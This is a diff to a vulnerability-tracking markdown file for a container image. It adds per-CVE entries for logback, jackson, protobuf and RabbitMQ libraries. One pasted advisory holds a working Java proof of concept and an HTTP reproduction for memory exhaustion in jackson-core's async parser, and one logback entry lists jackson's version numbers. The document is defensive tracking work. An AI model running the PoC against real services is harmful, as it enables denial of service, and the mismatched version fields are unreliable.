@@ -70,7 +70,6 @@
 | tar | CVE-2026-18508 | MEDIUM | 1.34+dfsg-1ubuntu0.1.22.04.6 | None | Ubuntu 22.04 runtime layer | affected | Unassigned | TBD |
 | util-linux | CVE-2026-27456 | MEDIUM | 2.37.2-4ubuntu3.5 | None | Ubuntu 22.04 runtime layer | affected | Unassigned | TBD |
 | wget | CVE-2021-31879 | MEDIUM | 1.21.2-2ubuntu1.5 | None | Ubuntu 22.04 runtime layer | affected | Unassigned | TBD |
-
 | ch.qos.logback:logback-core | CVE-2026-10532 | LOW | 1.5.32 | 1.5.34 | Java application layer | fixed | Unassigned | TBD |
 | ch.qos.logback:logback-core | CVE-2026-9828 | LOW | 1.5.32 | 1.5.33 | Java application layer | fixed | Unassigned | TBD |
 | com.fasterxml.jackson.core:jackson-core | GHSA-r7wm-3cxj-wff9 | HIGH | 2.21.2 | 2.18.8, 2.21.4 | Java application layer | fixed | Unassigned | TBD |
@@ -101,6 +100,7 @@
 | org.apache.commons:commons-lang3 | CVE-2025-48924 | MEDIUM | 3.17.0 | 3.18.0 | Java application layer | fixed | Unassigned | TBD |
 | org.apache.logging.log4j:log4j-api | CVE-2026-49844 | MEDIUM | 2.24.3 | 2.25.5, 2.26.1 | Java application layer | fixed | Unassigned | TBD |
 | org.apache.tomcat.embed:tomcat-embed-core | CVE-2026-41293 | CRITICAL | 10.1.54 | 9.0.118, 10.1.55, 11.0.22 | Java application layer | fixed | Unassigned | TBD |
+
 | org.apache.tomcat.embed:tomcat-embed-core | CVE-2026-43512 | CRITICAL | 10.1.54 | 9.0.118, 10.1.55, 11.0.22 | Java application layer | fixed | Unassigned | TBD |
 | org.apache.tomcat.embed:tomcat-embed-core | CVE-2026-43515 | CRITICAL | 10.1.54 | 9.0.118, 10.1.55, 11.0.22 | Java application layer | fixed | Unassigned | TBD |
 | org.apache.tomcat.embed:tomcat-embed-core | CVE-2026-41284 | HIGH | 10.1.54 | 9.0.118, 10.1.55, 11.0.22 | Java application layer | fixed | Unassigned | TBD |
@@ -632,7 +632,487 @@
 - Exception expiry: 
 - Notes: 
 
-### <CVE-ID>: <short description>
+### CVE-2026-10532 : Deserialization of untrusted data vulnerability in QOS.CH Sarl logback logback-core (HardenedObjectInputStream (logback-core) modules) allows Object Injection, albeit heavily restricted.\n\nMore precisely, an attacker able to influence serialized data sent to \nSimpleSocketServer or SimpleSSLSocketServer can instantiate Proxy objects.\n\n\nAlthough deserialization is heavily restricted by HardenedObjectInputStream and no \npractical way to achieve remote code execution or significant privilege \nescalation has been identified, this issue constitutes a bypass of the \nintended security restrictions.\n\n\n\nThis issue affects logback: through 1.5.33 inclusive.
+          
+- Package: ch.qos.logback:logback-core
+- Severity: LOW
+- Installed version: 1.5.32
+- Fixed version: 1.5.34
+- Location: Java application layer
+- Exploitability: known
+- Reachable at runtime: no
+- Trivy Status: fixed
+- Security Disposition: open
+- Remediation: 
+- Tracking issue: 
+- Exception expiry: 
+- Notes:
+
+### CVE-2026-9828 : Deserialization of untrusted data vulnerability in QOS.CH Sarl logback logback-core (HardenedObjectInputStream (logback-core) modules) allows Object Injection albeit heavily restricted.\n\nMore precisely, an attacker able to influence serialized data sent to \nSimpleSocketServer or SimpleSSLSocketServer can instantiate objects from\n classes in the java.lang and java.util packages that are not explicitly\n blocked.\n\nAlthough deserialization is heavily restricted by HardenedObjectInputStream and no \npractical way to achieve remote code execution or significant privilege \nescalation has been identified, this issue constitutes a bypass of the \nintended security restrictions.\n\n\n\nThis issue affects logback: through 1.5.32 inclusive.
+          
+- Package: ch.qos.logback:logback-core
+- Severity: LOW
+- Installed version: 2.21.2
+- Fixed version: 2.18.8, 2.21.4
+- Location: Java application layer
+- Exploitability: known
+- Reachable at runtime: no
+- Trivy Status: fixed
+- Security Disposition: open
+- Remediation: 
+- Tracking issue: 
+- Exception expiry: 
+- Notes:
+
+  ### GHSA-r7wm-3cxj-wff9:## Summary\n\nThe fix released in jackson-core `2.18.6` and `2.21.1` for [GHSA-72hv-8253-57qq](https://github.com/FasterXML/jackson-core/security/advisories/GHSA-72hv-8253-57qq) (Number Length Constraint Bypass in Async Parser, published 2026-02-28) is incomplete. The fix commit `b0c428e6` (#1555) wired `validateIntegerLength` into a new `_setIntLength` helper and called it at every place where the integer portion of a number is *decided* (terminator byte arrived, `.` / `e/E` seen, end-of-feed inside a fully-buffered value). It did not call it on the much more attacker-relevant path: \"ran out of input while still inside `MINOR_NUMBER_INTEGER_DIGITS`, return `NOT_AVAILABLE` to caller\".\n\nAs a result, an attacker who streams JSON to a non-blocking parser in many small chunks, without ever sending a terminator byte, can keep the parser inside `MINOR_NUMBER_INTEGER_DIGITS` indefinitely. `_textBuffer.expandCurrentSegment()` grows on every chunk, and `validateIntegerLength` is never invoked. The accumulator is only gated by `maxStringLength` (20 MiB default) — a **~20,000x amplification** of the documented `maxNumberLength` (1000 default).\n\nThis is the same vulnerability class, same advisory wording (\"Memory Exhaustion: Unbounded allocation in TextBuffer from excessively long numbers\"), same parser class — just the streaming path the original fix didn't cover. The fix to the *fraction* path is correct (see `_finishFloatFraction` at line 1834-1837 of `NonBlockingUtf8JsonParserBase.java` in 2.18.6, where `_setFractLength(fractLen)` IS called before the `NOT_AVAILABLE` return); the equivalent call is missing from every integer-digit path.\n\n## Affected versions\n\nVerified on the patched releases:\n- `com.fasterxml.jackson.core:jackson-core` **2.18.6**\n- `com.fasterxml.jackson.core:jackson-core` **2.21.1**\n\nStructurally identical code in `tools.jackson.core` 3.0.x / 3.1.x — same `NonBlockingUtf8JsonParserBase` class, same `_setIntLength` rollout, same NOT_AVAILABLE returns without validation. Not retested but presumed vulnerable.\n\n## Affected code\n\n[`src/main/java/com/fasterxml/jackson/core/json/async/NonBlockingUtf8JsonParserBase.java`](https://github.com/FasterXML/jackson-core/blob/b0c428e6/src/main/java/com/fasterxml/jackson/core/json/async/NonBlockingUtf8JsonParserBase.java) in 2.18.6 / 2.21.1.\n\n### Site 1 — `_startPositiveNumber(int ch)` lines 1320-1330:\n\n```java\nif (outPtr \u003e= outBuf.length) {\n    // NOTE: must expand to ensure contents all in a single buffer (to keep\n    // other parts of parsing simpler)\n    outBuf = _textBuffer.expandCurrentSegment();\n}\noutBuf[outPtr++] = (char) ch;\nif (++_inputPtr \u003e= _inputEnd) {\n    _minorState = MINOR_NUMBER_INTEGER_DIGITS;\n    _textBuffer.setCurrentLength(outPtr);\n    return _updateTokenToNA();          // \u003c-- no validateIntegerLength(outPtr)\n}\n```\n\n### Site 2 — `_finishNumberIntegralPart` lines 1691-1727:\n\n```java\nprotected JsonToken _finishNumberIntegralPart(char[] outBuf, int outPtr) throws IOException {\n    int negMod = _numberNegative ? -1 : 0;\n\n    while (true) {\n        if (_inputPtr \u003e= _inputEnd) {\n            _minorState = MINOR_NUMBER_INTEGER_DIGITS;\n            _textBuffer.setCurrentLength(outPtr);\n            return _updateTokenToNA();    // \u003c-- no validateIntegerLength(outPtr + negMod)\n        }\n        int ch = getByteFromBuffer(_inputPtr) \u0026 0xFF;\n        if (ch \u003c INT_0) {\n            if (ch == INT_PERIOD) {\n                _setIntLength(outPtr+negMod);   // \u003c-- validated here\n                ++_inputPtr;\n                return _startFloat(outBuf, outPtr, ch);\n            }\n            break;\n        }\n        if (ch \u003e INT_9) {\n            if ((ch | 0x20) == INT_e) {\n                _setIntLength(outPtr+negMod);   // \u003c-- validated here\n                ++_inputPtr;\n                return _startFloat(outBuf, outPtr, ch);\n            }\n            break;\n        }\n        ++_inputPtr;\n        if (outPtr \u003e= outBuf.length) {\n            outBuf = _textBuffer.expandCurrentSegment();\n        }\n        outBuf[outPtr++] = (char) ch;\n    }\n    _setIntLength(outPtr+negMod);            // \u003c-- validated here\n    _textBuffer.setCurrentLength(outPtr);\n    return _valueComplete(JsonToken.VALUE_NUMBER_INT);\n}\n```\n\nThe pattern recurs at lines 1297, 1329, 1343, 1365, 1395, 1409, 1437, 1467, 1481, 1586, 1644, 1698 — every \"ran out of input mid-integer\" exit returns to the caller without validating the accumulator length.\n\n### Compare with the fraction path that is correct\n\n`_finishFloatFraction` lines 1827-1838:\n\n```java\nwhile (loop) {\n    if (ch \u003e= INT_0 \u0026\u0026 ch \u003c= INT_9) {\n        ++fractLen;\n        if (outPtr \u003e= outBuf.length) {\n            outBuf = _textBuffer.expandCurrentSegment();\n        }\n        outBuf[outPtr++] = (char) ch;\n        if (_inputPtr \u003e= _inputEnd) {\n            _textBuffer.setCurrentLength(outPtr);\n            _setFractLength(fractLen);          // \u003c-- VALIDATED\n            return JsonToken.NOT_AVAILABLE;\n        }\n        ch = getNextSignedByteFromBuffer();\n    }\n    ...\n}\n```\n\n## Impact\n\nReactive frameworks (Spring WebFlux / Reactor, Quarkus, Helidon, Vert.x JSON, anything wrapping `JsonFactory.createNonBlockingByteArrayParser()` or `createNonBlockingByteBufferParser()`) feed inbound HTTP/gRPC bytes to the async parser as they arrive. Operators who set `StreamReadConstraints.builder().maxNumberLength(N)` on the assumption that this caps memory per number value are not getting that guarantee in chunked-feed scenarios. The parser silently accumulates digits up to `maxStringLength` (20 MiB default) per concurrent connection. Multiply by attacker-controlled concurrency to OOM the JVM.\n\nThe synchronous parsers (`UTF8StreamJsonParser`, `ReaderBasedJsonParser`) and the async parser on *complete* input are not affected — those paths go through `_setIntLength` or `ParserBase._reportTooLongIntegral` correctly.\n\nCWE-770 (Allocation of Resources Without Limits or Throttling), CVSS roughly the same as the parent advisory (Network / Low complexity / High availability impact). The parent advisory was scored CVSS 8.7 High.\n\n## Proof of concept\n\nStandalone PoC, no Maven required:\n\n```\nmkdir poc \u0026\u0026 cd poc\ncurl -sLo jackson-core-2.18.6.jar https://repo1.maven.org/maven2/com/fasterxml/jackson/core/jackson-core/2.18.6/jackson-core-2.18.6.jar\ncat \u003e PoC.java \u003c\u003c'EOF'\nimport com.fasterxml.jackson.core.*;\nimport com.fasterxml.jackson.core.async.ByteArrayFeeder;\n\npublic class PoC {\n    public static void main(String[] args) throws Exception {\n        StreamReadConstraints strict = StreamReadConstraints.builder()\n                .maxNumberLength(1000)\n                .build();\n        JsonFactory f = new JsonFactoryBuilder()\n                .streamReadConstraints(strict)\n                .build();\n\n        // Sanity: synchronous parser rejects 5000-digit int.\n        try (JsonParser p = f.createParser(\"{\\\"v\\\":\" + \"1\".repeat(5000) + \"}\")) {\n            while (p.nextToken() != null) { /* drive */ }\n            System.out.println(\"[-] BUG ABSENT: sync parser accepted\");\n            return;\n        } catch (Exception e) {\n            System.out.println(\"[+] sync parser rejected 5000-digit int: \" + e.getClass().getSimpleName());\n        }\n\n        // Bug: async parser, chunked, no terminator.\n        JsonParser ap = f.createNonBlockingByteArrayParser();\n        ByteArrayFeeder feeder = (ByteArrayFeeder) ap;\n\n        byte[] preamble = \"{\\\"v\\\":\".getBytes(\"UTF-8\");\n        feeder.feedInput(preamble, 0, preamble.length);\n        while (ap.nextToken() != JsonToken.NOT_AVAILABLE) { /* drain */ }\n\n        byte[] digits = new byte[16 * 1024];\n        for (int i = 0; i \u003c digits.length; i++) digits[i] = (byte) ('1' + (i % 9));\n\n        for (int c = 0; c \u003c 600; c++) {\n            feeder.feedInput(digits, 0, digits.length);\n            JsonToken t = ap.nextToken();\n            if (t != JsonToken.NOT_AVAILABLE) {\n                System.out.println(\"[-] unexpected token: \" + t);\n                return;\n            }\n        }\n        System.out.println(\"[+] BUG PRESENT: async parser accepted ~9.83 MB of digits with maxNumberLength=1000\");\n\n        // Closing the number now finally triggers the validator.\n        feeder.feedInput(\"}\".getBytes(\"UTF-8\"), 0, 1);\n        feeder.endOfInput();\n        try {\n            while (ap.nextToken() != null) { /* drive */ }\n        } catch (Exception e) {\n            System.out.println(\"[*] late rejection on close: \" + e.getMessage().split(\"\\n\")[0]);\n        }\n        ap.close();\n    }\n}\nEOF\njavac -cp jackson-core-2.18.6.jar PoC.java\njava -Xmx256m -cp jackson-core-2.18.6.jar:. PoC\n```\n\nObserved output against `jackson-core-2.18.6`:\n\n```\n[+] sync parser rejected 5000-digit int: StreamConstraintsException\n[+] BUG PRESENT: async parser accepted ~9.83 MB of digits with maxNumberLength=1000\n[*] late rejection on close: Number value length (9830400) exceeds the maximum allowed (1000, from `StreamReadConstraints.getMaxNumberLength()`)\n```\n\nObserved output against `jackson-core-2.21.1`: identical.\n\nThe 9.83 MB figure is purely a function of the loop bound (600 chunks * 16 KiB). The actual ceiling is `maxStringLength = 20 MiB`. With the strict policy declared as `maxNumberLength = 1000`, the parser permits **9830x** more allocation than the policy allows. With `maxStringLength` left at the default 20 MiB, an attacker can drive a single connection to 40 MiB of `char[]` heap (chars are 2 bytes each) before the validator finally fires on terminator/`endOfInput()`. Multiply by concurrent connections.\n\n## End-to-end reproduction through real HTTP\n\nSupplements the standalone PoC with a running Spring Boot WebFlux server,\ndriving the same bug through the actual reactor-netty + Jackson2JsonDecoder\nstreaming-decode path that production reactive endpoints use.\n\nSetup:\n- Spring Boot 3.3.5 starter-webflux (spring-webflux 6.1.14, reactor-netty 1.1.23)\n- jackson-databind 2.17.2, jackson-core overridden:\n  - VULN run: `com.fasterxml.jackson.core:jackson-core:2.18.7` (latest published)\n  - PATCHED run: `2.18.8-SNAPSHOT` built from the fix branch\n- JVM: OpenJDK 17.0.18\n- Server `JsonFactory` configured with `StreamReadConstraints.builder().maxNumberLength(1000).build()`\n\nEndpoint under test exposes the `Flux\u003cDataBuffer\u003e` request body directly to\n`Jackson2JsonDecoder.decode(Flux, ResolvableType, ...)` so the parser sees one\nHTTP chunk per `feedInput` (the same pattern used for any\n`@RequestBody Flux\u003c...\u003e` / streaming JSON decoder in WebFlux). A raw-socket\nHTTP/1.1 chunked client streams `{\"v\":1` then 250 chunks of 200 digit bytes\neach (50,000 digits total) at 20ms intervals, then writes the closing `}`.\n\nVULN — jackson-core 2.18.7:\n```\n[VULN-SMALLCHUNK] streamed 50000 digits across 250 chunks; server still accepting\n[VULN-SMALLCHUNK] full POST sent (50000 digits). Response:\nHTTP/1.1 200 OK\nERR after 6548ms cause=com.fasterxml.jackson.core.exc.StreamConstraintsException:\n       Number value length (50000) exceeds the maximum allowed (1000, ...)\n```\nServer-side controller trace (250 DataBuffer arrivals elided):\n```\n[ctrl] DataBuffer arrived size=6   ms=39       \u003c- '{\"v\":1'\n[ctrl] DataBuffer arrived size=200 ms=42\n...\n[ctrl] DataBuffer arrived size=199 ms=5993\n[ctrl] DataBuffer arrived size=1   ms=6518     \u003c- closing '}'\n[ctrl] ERR after 6548ms ... Number value length (50000) exceeds ...\n```\nServer held all 50,000 digit characters in `_textBuffer` for 6.5 seconds with\n`maxNumberLength=1000` declared. The validator never fires during streaming;\nit only fires at value-completion when the closing `}` arrives.\n\nPATCHED — jackson-core 2.18.8-SNAPSHOT (fix branch):\n```\n[PATCHED-SMALLCHUNK] connection broke after 2801 digits at chunk 14: [Errno 32] Broken pipe\n[PATCHED-SMALLCHUNK] DONE: digits_sent=2801 status=connection-broke-mid-stream\n```\nServer-side controller trace:\n```\n[ctrl] DataBuffer arrived size=6   ms=129\n[ctrl] DataBuffer arrived size=200 ms=142\n[ctrl] DataBuffer arrived size=200 ms=142\n[ctrl] DataBuffer arrived size=200 ms=145\n[ctrl] DataBuffer arrived size=200 ms=146\n[ctrl] DataBuffer arrived size=200 ms=147\n[ctrl] ERR after 155ms ... Number value length (1001) exceeds the maximum allowed (1000, ...)\n```\nPatched server raises `StreamConstraintsException` at 155ms after only 5\nDataBuffers, exactly when the accumulated digit count crosses\n`maxNumberLength=1000`. The connection is reset mid-stream rather than the\nparser silently consuming the rest of the attacker's payload.\n\nSide-by-side:\n\n| Build | Chunks accepted before exception | Digits buffered | Time to detection |\n|---|---|---|---|\n| jackson-core 2.18.7 | 250 (full payload) | 50,000 (50x the configured limit) | 6,548ms — only at terminator |\n| 2.18.8-SNAPSHOT (fix branch) | 5 | 1,001 | 155ms — moment threshold crossed |\n\nNote on the default `@RequestBody Mono\u003cJsonNode\u003e` path: that path cannot\ndistinguish the two builds because Spring's `decodeToMono` joins all\nDataBuffers into one before parsing. The exploitable shape is the\nstreaming-decode path (`Flux\u003cJsonNode\u003e` / `@RequestBody Flux\u003c...\u003e` /\nWebSocket / SSE / any direct `decoder.decode(Flux\u003cDataBuffer\u003e, ...)` call),\nwhich is also what `Jackson2Tokenizer` uses for any streaming JSON\ndeserialization in WebFlux and Quarkus reactive REST.\n\n## Suggested fix\n\nMirror the pattern already used in `_finishFloatFraction`. At every site that returns `_updateTokenToNA()` (or `JsonToken.NOT_AVAILABLE`) with `_minorState = MINOR_NUMBER_INTEGER_DIGITS`, call `_setIntLength(outPtr + negMod)` first. Concretely, the diff to `NonBlockingUtf8JsonParserBase.java` would be:\n\n```diff\n     protected JsonToken _finishNumberIntegralPart(char[] outBuf, int outPtr) throws IOException {\n         int negMod = _numberNegative ? -1 : 0;\n\n         while (true) {\n             if (_inputPtr \u003e= _inputEnd) {\n                 _minorState = MINOR_NUMBER_INTEGER_DIGITS;\n                 _textBuffer.setCurrentLength(outPtr);\n+                _streamReadConstraints.validateIntegerLength(outPtr + negMod);\n                 return _updateTokenToNA();\n             }\n```\n\nNote: `_setIntLength` itself can't be used as-is because it also assigns `_intLength`, and `_intLength` must not be set until the integer is truly complete (subsequent fraction handling reads `_intLength`). The minimal fix is to call only the validator, as shown.\n\nApply the same one-line insertion before each `return _updateTokenToNA();` that exits with `_minorState = MINOR_NUMBER_INTEGER_DIGITS`. The sites are listed above (12 lines total).\n\nAlternatively, a heavier refactor: also gate `_textBuffer.expandCurrentSegment()` calls inside the digit-accumulation loops on `outPtr \u003c maxNumberLength` so that the validator fires at the moment the buffer would be enlarged past the limit, rather than waiting for the next chunk boundary. Either approach is sufficient.\n\n## Credit\n\nReported by `tonghuaroot` (`tonghuaroot@gmail.com`). Variant hunt against the Feb 2026 fix for GHSA-72hv-8253-57qq.
+          
+- Package: com.fasterxml.jackson.core:jackson-core
+- Severity: HIGH
+- Installed version: 2.21.2
+- Fixed version: 2.18.8, 2.21.4
+- Location: Java application layer
+- Exploitability: known
+- Reachable at runtime: no
+- Trivy Status: fixed
+- Security Disposition: open
+- Remediation: 
+- Tracking issue: 
+- Exception expiry: 
+- Notes:
+
+### CVE-2026-54512: jackson-databind contains the general-purpose data-binding functionality and tree-model for Jackson Data Processor. From 2.10.0 until 2.18.8, 2.21.4, and 3.1.4, jackson-databind's PolymorphicTypeValidator (PTV) is the primary safety mechanism guarding polymorphic deserialization. When polymorphic typing is enabled and a type identifier contains generic parameters (i.e. the type ID string contains \u003c), DatabindContext._resolveAndValidateGeneric() validates only the raw container class name (the substring before \u003c) against the configured PTV. If the container type is approved, the method parses the full canonical type string via TypeFactory.constructFromCanonical() and returns the fully parameterized type without ever validating the nested type arguments against the PTV. The nested type arguments are then resolved, instantiated, and populated as beans during deserialization. An attacker who controls the type ID can therefore place a denied class as a generic type parameter of an allowed container — for example java.util.ArrayList\u003ccom.evil.Gadget\u003e when only java.util.ArrayList is allow-listed. The container passes the PTV check; com.evil.Gadget is loaded via Class.forName(name, true, loader), instantiated, and its properties are set from attacker-controlled JSON. This completely bypasses an explicitly configured PTV allow-list. This vulnerability is fixed in 2.18.8, 2.21.4, and 3.1.4.
+          
+- Package: com.fasterxml.jackson.core:jackson-databind
+- Severity: HIGH
+- Installed version: 2.15.2
+- Fixed version: 2.18.8, 3.1.4, 2.21.4
+- Location: Java application layer
+- Exploitability: known
+- Reachable at runtime: no
+- Trivy Status: fixed
+- Security Disposition: open
+- Remediation: 
+- Tracking issue: 
+- Exception expiry: 
+- Notes:
+
+  ### CVE-2026-54513 : jackson-databind contains the general-purpose data-binding functionality and tree-model for Jackson Data Processor. From 2.10.0 until 2.18.8, 2.21.4, and 3.1.4, BasicPolymorphicTypeValidator.Builder.allowIfSubTypeIsArray() allowlists any array type based only on clazz.isArray(), without validating the array's component (element) type against the configured allowlist. A PTV built with allowIfSubTypeIsArray() plus an explicit concrete-type allowlist therefore still permits EvilType[] even though EvilType is not allowlisted. When Jackson deserializes the elements and no per-element type IDs are present, it instantiates the component type directly with no further PTV check, bypassing the allowlist. This vulnerability is fixed in 2.18.8, 2.21.4, and 3.1.4.
+          
+- Package: com.fasterxml.jackson.core:jackson-databind
+- Severity: HIGH
+- Installed version: 2.15.2
+- Fixed version: 2.18.8, 2.21.4, 3.1.4
+- Location: Java application layer
+- Exploitability: known
+- Reachable at runtime: no
+- Trivy Status: fixed
+- Security Disposition: open
+- Remediation: 
+- Tracking issue: 
+- Exception expiry: 
+- Notes:
+
+  ### CVE-2026-54514:jackson-databind contains the general-purpose data-binding functionality and tree-model for Jackson Data Processor. From 2.0.0 until 2.18.8, 2.21.4, and 3.1.4, JDKFromStringDeserializer constructed InetSocketAddress with new InetSocketAddress(host, port), which performs eager DNS name resolution for hostname inputs at deserialization time. An application that binds untrusted JSON into a type containing an InetSocketAddress field issues an attacker-chosen DNS query during readValue, before any application-level validation or connect logic. The fix uses InetSocketAddress.createUnresolved(host, port), deferring DNS to an explicit connect. This vulnerability is fixed in 2.18.8, 2.21.4, and 3.1.4.
+          
+- Package: com.fasterxml.jackson.core:jackson-databind
+- Severity: MEDIUM
+- Installed version: 2.15.2
+- Fixed version: 2.18.8, 2.21.4, 3.1.4
+- Location: Java application layer
+- Exploitability: known
+- Reachable at runtime: no
+- Trivy Status: fixed
+- Security Disposition: open
+- Remediation: 
+- Tracking issue: 
+- Exception expiry: 
+- Notes:
+
+  ### CVE-2026-54515:jackson-databind contains the general-purpose data-binding functionality and tree-model for Jackson Data Processor. From 2.8.0 until 2.18.9, 2.21.5, and 3.1.4, in BeanDeserializerBase.createContextual(), per-property @JsonIgnoreProperties exclusions are applied by _handleByNameInclusion(), producing a contextual deserializer whose BeanPropertyMap has the ignored properties removed. The subsequent per-property case-insensitivity block (triggered by @JsonFormat(ACCEPT_CASE_INSENSITIVE_PROPERTIES)) rebuilds from this._beanProperties (the original, unfiltered map) instead of contextual._beanProperties, then overwrites the filtered map — restoring every property _handleByNameInclusion had just removed. The ignored property becomes writable again. This vulnerability is fixed in 2.18.9, 2.21.5, and 3.1.4. 
+          
+- Package: com.fasterxml.jackson.core:jackson-databind
+- Severity: MEDIUM
+- Installed version: 2.15.2
+- Fixed version: 3.1.4, 2.18.9, 2.21.5, 2.22.1
+- Location: Java application layer
+- Exploitability: known
+- Reachable at runtime: no
+- Trivy Status: fixed
+- Security Disposition: open
+- Remediation: 
+- Tracking issue: 
+- Exception expiry: 
+- Notes: 
+
+### CVE-2026-59888: jackson-databind contains the general-purpose data-binding functionality and tree-model for Jackson Data Processor. From 2.15.0 until 2.18.8, 2.21.4, and 3.1.4, Java Records using a PropertyNamingStrategy can bypass @JsonIgnore because POJOPropertiesCollector._removeUnwantedIgnorals() records an ignored component under its original implicit name before _renameUsing() applies the naming strategy, allowing the renamed JSON key to be assigned to the Record constructor parameter. This issue is fixed in versions 2.18.8, 2.21.4, and 3.1.4.
+          
+- Package: com.fasterxml.jackson.core:jackson-databind
+- Severity: MEDIUM
+- Installed version: 2.15.2
+- Fixed version: 2.18.8, 2.21.4
+- Location: Java application layer
+- Exploitability: known
+- Reachable at runtime: no
+- Trivy Status: fixed
+- Security Disposition: open
+- Remediation: 
+- Tracking issue: 
+- Exception expiry: 
+- Notes:
+
+  ### CVE-2021-22569:An issue in protobuf-java allowed the interleaving of com.google.protobuf.UnknownFieldSet fields in such a way that would be processed out of order. A small malicious payload can occupy the parser for several minutes by creating large numbers of short-lived objects that cause frequent, repeated pauses. We recommend upgrading libraries beyond the vulnerable versions.
+          
+- Package: com.google.protobuf:protobuf-java
+- Severity: HIGH
+- Installed version: 3.11.4
+- Fixed version: 3.16.1, 3.18.2, 3.19.2
+- Location: Java application layer
+- Exploitability: known
+- Reachable at runtime: no
+- Trivy Status: fixed
+- Security Disposition: open
+- Remediation: 
+- Tracking issue: 
+- Exception expiry: 
+- Notes:
+
+  ### CVE-2022-3509:A parsing issue similar to CVE-2022-3171, but with textformat in protobuf-java core and lite versions prior to 3.21.7, 3.20.3, 3.19.6 and 3.16.3 can lead to a denial of service attack. Inputs containing multiple instances of non-repeated embedded messages with repeated or unknown fields causes objects to be converted back-n-forth between mutable and immutable forms, resulting in potentially long garbage collection pauses. We recommend updating to the versions mentioned above.
+          
+- Package: com.google.protobuf:protobuf-java
+- Severity: HIGH
+- Installed version: 3.11.4
+- Fixed version: 3.16.3, 3.19.6, 3.20.3, 3.21.7
+- Location: Java application layer
+- Exploitability: known
+- Reachable at runtime: no
+- Trivy Status: fixed
+- Security Disposition: open
+- Remediation: 
+- Tracking issue: 
+- Exception expiry: 
+- Notes:
+
+  ### CVE-2022-3510: A parsing issue similar to CVE-2022-3171, but with Message-Type Extensions in protobuf-java core and lite versions prior to 3.21.7, 3.20.3, 3.19.6 and 3.16.3 can lead to a denial of service attack. Inputs containing multiple instances of non-repeated embedded messages with repeated or unknown fields causes objects to be converted back-n-forth between mutable and immutable forms, resulting in potentially long garbage collection pauses. We recommend updating to the versions mentioned above.\n\n
+          
+- Package: com.google.protobuf:protobuf-java
+- Severity: HIGH
+- Installed version: 3.11.4
+- Fixed version: 3.16.3, 3.19.6, 3.20.3, 3.21.7
+- Location: Java application layer
+- Exploitability: known
+- Reachable at runtime: no
+- Trivy Status: fixed
+- Security Disposition: open
+- Remediation: 
+- Tracking issue: 
+- Exception expiry: 
+- Notes:
+
+   ### CVE-2024-7254: Any project that parses untrusted Protocol Buffers data containing an arbitrary number of nested groups / series of SGROUP tags can corrupted by exceeding the stack limit i.e. StackOverflow. Parsing nested groups as unknown fields with DiscardUnknownFieldsParser or Java Protobuf Lite parser, or against Protobuf map fields, creates unbounded recursions that can be abused by an attacker.
+          
+- Package: com.google.protobuf:protobuf-java
+- Severity: HIGH
+- Installed version: 3.11.4
+- Fixed version: 3.25.5, 4.27.5, 4.28.2
+- Location: Java application layer
+- Exploitability: known
+- Reachable at runtime: no
+- Trivy Status: fixed
+- Security Disposition: open
+- Remediation: 
+- Tracking issue: 
+- Exception expiry: 
+- Notes:
+
+  ### CVE-2022-3171: A parsing issue with binary data in protobuf-java core and lite versions prior to 3.21.7, 3.20.3, 3.19.6 and 3.16.3 can lead to a denial of service attack. Inputs containing multiple instances of non-repeated embedded messages with repeated or unknown fields causes objects to be converted back-n-forth between mutable and immutable forms, resulting in potentially long garbage collection pauses. We recommend updating to the versions mentioned above.
+          
+- Package: com.google.protobuf:protobuf-java
+- Severity: MEDIUM
+- Installed version: 3.11.4
+- Fixed version: 3.21.7, 3.20.3, 3.19.6, 3.16.3
+- Location: Java application layer
+- Exploitability: known
+- Reachable at runtime: no
+- Trivy Status: fixed
+- Security Disposition: open
+- Remediation: 
+- Tracking issue: 
+- Exception expiry: 
+- Notes:
+
+  ### CVE-2026-63337: The RabbitMQ Java client library allows Java and JVM-based applications to connect to and interact with RabbitMQ nodes. Prior to 5.33.0, com.rabbitmq.tools.jsonrpc.ProcedureDescription receives a javaReturnType value in an untrusted system.describe response and passes it through JSONUtil.tryFill, setJavaReturnType, and computeReturnTypeAsJavaClass to Class.forName(javaReturnType) with initialization enabled. An attacker able to answer the JsonRpcClient request through a shared broker or network interception can select a class already present in the victim JVM and trigger its static initializer, while JsonRpcClient.java later passes getReturnType output to mapper.parse and may also create type confusion. Successful exploitation can affect confidentiality, integrity, and availability in the client process. This issue is fixed in version 5.33.0.
+          
+- Package: com.rabbitmq:amqp-client
+- Severity: HIGH
+- Installed version: 5.25.0
+- Fixed version: 5.33.0
+- Location: Java application layer
+- Exploitability: known
+- Reachable at runtime: no
+- Trivy Status: fixed
+- Security Disposition: open
+- Remediation: 
+- Tracking issue: 
+- Exception expiry: 
+- Notes:
+
+  ### CVE-2026-69219: The RabbitMQ Java client library allows Java and JVM-based applications to connect to and interact with RabbitMQ nodes. Prior to 5.33.1, src/main/java/com/rabbitmq/client/impl/ValueReader.java uses ValueReader.readBytes to accept a wire-declared contentLength below Integer.MAX_VALUE and allocate a byte array before checking the bytes available in the frame. A malicious AMQP peer can send a LongString or byte-array field with type tag S and a declared length such as 0x7FFFFFFE during the pre-authentication connection.start server-properties table, causing an approximately 2 GB allocation and OutOfMemoryError before readFully consumes data. The resulting memory exhaustion can terminate the JVM and cause denial of service. This issue is fixed in version 5.33.1.
+          
+- Package: com.rabbitmq:amqp-client
+- Severity: HIGH
+- Installed version: 5.25.0
+- Fixed version: 5.33.1
+- Location: Java application layer
+- Exploitability: known
+- Reachable at runtime: no
+- Trivy Status: fixed 
+- Security Disposition: open
+- Remediation: 
+- Tracking issue: 
+- Exception expiry: 
+- Notes:
+
+  ### CVE-2026-69220: The RabbitMQ Java client library allows Java and JVM-based applications to connect to and interact with RabbitMQ nodes. Prior to 5.33.1, src/main/java/com/rabbitmq/client/impl/ValueReader.java permits ValueReader.readTable and ValueReader.readArray to call ValueReader.readFieldValue recursively for AMQP table type F and AMQP array type A values without a nesting-depth limit. A malicious AMQP server or network intermediary can send approximately 580 nested table levels in the pre-authentication connection.start frame, fitting within the default 131072-byte frame maximum, to trigger StackOverflowError. The error terminates the client input processing thread and causes denial of service. This issue is fixed in version 5.33.1.
+          
+- Package: com.rabbitmq:amqp-client
+- Severity: HIGH
+- Installed version: 5.25.0
+- Fixed version: 5.33.1
+- Location: Java application layer
+- Exploitability: known
+- Reachable at runtime: no
+- Trivy Status: fixed
+- Security Disposition: open
+- Remediation: 
+- Tracking issue: 
+- Exception expiry: 
+- Notes:
+
